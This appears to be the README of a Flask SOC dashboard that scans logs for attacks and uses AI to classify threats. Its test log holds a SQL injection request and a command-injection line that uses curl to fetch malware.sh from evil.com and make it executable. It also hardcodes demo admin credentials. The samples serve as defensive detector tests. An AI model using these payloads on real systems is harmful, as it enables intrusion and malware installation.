# AETHER SHIELD // AI-Powered Cyber Threat Detection & SOC Dashboard

Aether Shield is an enterprise-grade Security Operations Center (SOC) Dashboard and Cyber Threat Ingestion Portal. Built using Python Flask and custom modern Glassmorphism Vanilla CSS, it enables instant scanning of system logs, automated AI threat classifications, real-time packet capture simulations, and threat database reputation searches.

---

## ⚡️ IMPORTANT: Active Workspace Selection

To open, run, or edit this project directly in your editor, please set this subdirectory as your active workspace:
```
/Users/manjuyalam/.gemini/antigravity/scratch/cyber_threat_detector
```

---

## 🚀 Key Features

1. **Rule-Based Threat Ingestion Engine** (`detector.py`):
   - Multi-format parser support: `.txt`, `.log`, `.csv`, `.json`.
   - Pattern matching alerts for: **SQL Injection (SQLi)**, **Cross-Site Scripting (XSS)**, **Command Injection**, **Malware Indicators**, **Brute Force auth logins**, and **Port Scans**.
   - Custom Threat Index score calculation (0 - 100).
2. **Generative AI Security Analyst** (`ai_classifier.py`):
   - Connects to OpenAI API using the modern SDK.
   - Provides deep technical threat context, maps findings to **MITRE ATT&CK Tactics & Techniques**, lists SOC analyst notes, and drafts remediation plans.
   - **High-Fidelity Offline Fallback Engine**: If no API key is configured or the API is unreachable, a context-aware simulation engine takes over to generate detailed, realistic reports, making the app 100% interactive out of the box.
3. **Live Packet Monitor (Wireshark Style)** (`wireshark.js`):
   - Interactive live network capture grid showing packet headers.
   - Layer inspector (Frame, Ethernet, IP, TCP/UDP headers) and dynamic Hex + ASCII data payload dump generators.
   - Protocol selection filters and expression queries (e.g. `ip.src == ...`).
4. **VirusTotal Reputation Scanner** (`virustotal.js`):
   - Query IP addresses, Domain names, cryptographic File Hashes (MD5/SHA256), or URLs.
   - Returns vendor reputation checklist, geographic data, registry info, and gauge charts.
5. **Historical repository & Reports PDF**:
   - Stores scans permanently inside SQLite database.
   - In-app report archive manager with download options.
   - CSS print layout optimizations to save clean PDF reports.

---

## 📁 Project Architecture

```
cyber_threat_detector/
├── app.py                  # Main Flask controller & REST APIs
├── detector.py             # Rule-based threat signatures & regex parser
├── ai_classifier.py        # OpenAI analyst integration & local fallback simulation
├── requirements.txt        # Backend dependencies
├── README.md               # Documentation & guides
├── templates/
│   ├── login.html          # Secure login portal & cyber canvas animations
│   └── dashboard.html      # Modular multi-tab SOC dashboard layout
└── static/
    ├── css/
    │   └── styles.css      # Custom Vanilla glassmorphic styling & keyframes
    └── js/
        ├── dashboard.js    # Ingestion AJAX calls, Chart.js updates & counters
        ├── wireshark.js    # Live packet capture logic & hex generators
        └── virustotal.js   # reputation scanner tab and vendor lists updates
```

---

## 🛠️ Installation & Setup

### 1. Configure the Environment
Ensure Python 3.8+ is installed on your system. Navigate to the project directory and install the required dependencies:
```bash
pip install -r requirements.txt
```

### 2. Configure OpenAI API (Optional)
To enable real AI analyses, you can add your API key in a `.env` file in the root folder, or input it directly through the **SOC Settings** panel in the dashboard UI:
```env
OPENAI_API_KEY=your_actual_openai_api_key_here
SECRET_KEY=custom_session_secret_key
```
*(If left unconfigured, the dashboard will run in offline simulation mode automatically.)*

### 3. Run the Application
Start the Flask development server:
```bash
python app.py
```
Open your browser and navigate to:
```
http://127.0.0.1:5000
```

---

## 🔐 Credentials Clearance (Demo Login)

To access the security terminal dashboard, authenticate at the gate using the following operator credentials:
- **Identity Identifier (ID)**: `admin`
- **Crypto Access Key (KEY)**: `cybersecurity2026`

---

## 🛡️ Verification and Testing
To verify rule parsing locally, compile a mock log file (e.g., `test.log`) with the following threat footprints:
```text
192.168.1.50 - - [26/May/2026:12:01:02 +0000] "GET /index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 450
May 26 12:05:01 mail sshd[12345]: Failed password for invalid user admin from 45.142.195.12 port 49152 ssh2
192.168.1.102 - - [26/May/2026:12:06:12 +0000] "GET /vulnerable.php?cmd=curl%20http://evil.com/malware.sh%20-o%20/tmp/malware%20&&%20chmod%20+x%20/tmp/malware HTTP/1.1" 200 120
```
Drag and drop this file in the **Upload & Scan Logs** tab to view the live parsing breakdown and MITRE mapping outputs!
